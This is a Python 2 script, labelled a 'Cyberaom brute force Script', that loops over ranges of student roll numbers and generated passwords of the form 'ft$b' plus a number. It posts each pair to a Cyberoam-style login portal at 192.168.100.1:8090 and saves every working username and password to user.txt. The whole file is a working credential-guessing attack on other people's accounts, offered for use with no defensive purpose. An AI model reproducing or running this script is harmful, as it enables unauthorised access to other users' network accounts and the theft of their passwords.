__author__ = 'Xplore'
# Cyberaom brute force Script

import urllib
import time
import datetime
import urllib2
import xml.dom.minidom as XML
#userid = raw_input("enter user id:")
userid=[]
test=[]
trst={}
start=int(raw_input("Enter the starting Roll:"))
end=int(raw_input("Enter the last Roll:"))
for s in range(start,end+1):
    userid.append(s)
'''
checkList = range(0,100)
checkList1=range(10,20)
for j in checkList1:
    for i in checkList:
        #userid ='1307117'
        test.append('ft$b'+str("%02d"%j)+str("%02d"%i))
'''

range_st=int(raw_input("Enter the starting number:"))
range_ed=int(raw_input("Enter the last number:"))

for i in range(range_st,range_ed+1):
              test.append('ft$b'+str(i))
print "-------------------------------"
print len(test)
def sendLoginRequest(username, password):
    url = 'https://192.168.100.1:8090/httpclient.html'
    post_data = 'mode=191' + '&username=' + str(username) + '&password=' + password
    try:
        req = urllib2.Request(url, post_data)
        response = urllib2.urlopen(req)
        xml_dom = XML.parseString(response.read())
        document = xml_dom.documentElement
        response = document.getElementsByTagName('message')[0].childNodes[0].nodeValue
        print response
        if 'successfully' in response:
            return True
        elif 'limit' in response:
            return True
        elif 'data' in response:
            return True
        

    except:
        return False

def sendLogoutRequest(username):
    url = 'https://192.168.100.1:8090/httpclient.html'
    post_data = 'mode=193' + '&username=' + username
    req = urllib2.Request(url, post_data)
    response = urllib2.urlopen(req)
    print response
    print 'logout.'

for o in userid:
    for l in test:
         print l+" "+str(o)
         if sendLoginRequest(o, l) == True:
            #urllib.urlopen("http://google.com")
            print 'success!!! and '+l+' - password, userid -'+str(o)
            trst[o]=l
            sendLogoutRequest(str(o))
            with open("user.txt","a") as myfile:
                myfile.write(str(o)+" "+str(l)+'\n')
            
         

print trst
#lgt = raw_input("do you want to log out -type yes  :")

#if lgt == 'yes':
    #sendLogoutRequest(userid)











